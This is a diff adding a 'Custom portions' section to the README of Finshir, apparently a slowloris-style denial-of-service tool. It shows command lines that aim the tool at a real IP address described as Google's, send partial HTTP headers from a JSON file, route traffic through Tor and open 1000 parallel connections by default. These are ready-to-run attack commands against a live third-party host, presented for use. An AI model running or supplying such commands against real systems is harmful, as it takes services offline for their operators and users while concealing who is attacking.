@@ -164,6 +164,15 @@ You can do this by specifying the `--use-tor` flag. It connects to your local SO
 $ finshir --receiver=64.233.165.113:80 --use-tor
 ```
 
+
+### Custom portions
+By default, Finshir generates 100 empty spaces as data portions to send. You can override this behaviour by specifying your custom messages as a file, consisting of a single JSON array. This example is focused on Google:
+
+```bash
+# Send partial HTTP headers to Google using `--portions-file`
+$ finshir --receiver=64.233.165.113:80 --portions-file files/google.json
+```
+
 ### Connections count
 The default number of parallel connections is 1000. However, you can modify this limit using the `--connections` option, but be sure that you system is able to handle such amount of file descriptors:
 
